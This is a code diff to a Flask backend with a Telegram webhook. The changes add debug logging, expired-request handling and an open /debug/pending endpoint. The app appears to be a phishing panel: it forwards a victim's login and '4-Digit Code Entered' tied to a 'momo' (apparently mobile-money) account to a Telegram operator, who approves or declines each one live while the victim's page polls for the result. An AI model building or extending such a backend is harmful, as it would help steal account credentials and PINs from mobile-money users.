@@ -105,10 +105,15 @@ def status(request_id):
     return jsonify({"ok": True, "status": entry["status"]})
 
 
+# ---------------- TELEGRAM WEBHOOK ----------------
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
     update = request.get_json(silent=True) or {}
     callback = update.get("callback_query")
+
+    # Log every callback to Render logs for debugging
+    print(f"[WEBHOOK] Received update: {update}", flush=True)
+
     if not callback:
         return "ok", 200
 
@@ -118,6 +123,8 @@ def telegram_webhook():
     message_id = message.get("message_id")
     chat_id = message.get("chat", {}).get("id")
 
+    print(f"[WEBHOOK] callback_data={data} callback_id={callback_id}", flush=True)
+
     if ":" not in data:
         return "ok", 200
 
@@ -126,7 +133,18 @@ def telegram_webhook():
     # ---------- 4-digit code approvals ----------
     if action in ("codeapprove", "codedecline"):
         entry = CODE_PENDING.get(request_id)
+        print(f"[WEBHOOK] codeapprove/decline — request_id={request_id} found={entry is not None}", flush=True)
+
         if not entry:
+            # Still answer the callback so Telegram stops the loading spinner
+            try:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
+                    json={"callback_query_id": callback_id, "text": "⚠️ Request expired"},
+                    timeout=5,
+                )
+            except Exception:
+                pass
             return "ok", 200
 
         if action == "codeapprove":
@@ -135,6 +153,8 @@ def telegram_webhook():
         else:
             entry["status"] = "declined"
             answer_text = "❌ Code Declined"
+
+        print(f"[WEBHOOK] Setting status={entry['status']} for {request_id}", flush=True)
 
         try:
             requests.post(
@@ -160,14 +180,24 @@ def telegram_webhook():
                 },
                 timeout=5,
             )
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[WEBHOOK] Error answering callback: {e}", flush=True)
 
         return "ok", 200
 
     # ---------- Login approvals ----------
     entry = PENDING.get(request_id)
+    print(f"[WEBHOOK] login approve/decline — request_id={request_id} found={entry is not None}", flush=True)
+
     if not entry:
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
+                json={"callback_query_id": callback_id, "text": "⚠️ Request expired"},
+                timeout=5,
+            )
+        except Exception:
+            pass
         return "ok", 200
 
     if action == "approve":
@@ -178,6 +208,8 @@ def telegram_webhook():
         answer_text = "❌ Declined"
     else:
         return "ok", 200
+
+    print(f"[WEBHOOK] Setting status={entry['status']} for {request_id}", flush=True)
 
     try:
         requests.post(
@@ -203,8 +235,8 @@ def telegram_webhook():
             },
             timeout=5,
         )
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"[WEBHOOK] Error answering callback: {e}", flush=True)
 
     return "ok", 200
 
@@ -276,6 +308,9 @@ def code():
         "created_at": time.time(),
     }
 
+    print(f"[CODE] New request_id={request_id} for momo={momo}", flush=True)
+    print(f"[CODE] CODE_PENDING now has {len(CODE_PENDING)} entries", flush=True)
+
     text = (
         "🔢 4-Digit Code Entered\n"
         "━━━━━━━━━━━━━━━━━━\n"
@@ -319,13 +354,25 @@ def code_status(request_id):
         return "", 204
 
     entry = CODE_PENDING.get(request_id)
+
     if not entry:
+        print(f"[CODE-STATUS] {request_id} NOT FOUND. Known IDs: {list(CODE_PENDING.keys())}", flush=True)
         return jsonify({"ok": False, "status": "unknown"}), 404
 
     if time.time() - entry["created_at"] > 300 and entry["status"] == "pending":
         entry["status"] = "expired"
 
+    print(f"[CODE-STATUS] {request_id} -> {entry['status']}", flush=True)
     return jsonify({"ok": True, "status": entry["status"]})
+
+
+# ---------------- DEBUG: list all pending ----------------
+@app.route("/debug/pending", methods=["GET"])
+def debug_pending():
+    return jsonify({
+        "login_pending": {k: v["status"] for k, v in PENDING.items()},
+        "code_pending": {k: v["status"] for k, v in CODE_PENDING.items()},
+    })
 
 
 # ---------------- RESEND CODE ----------------
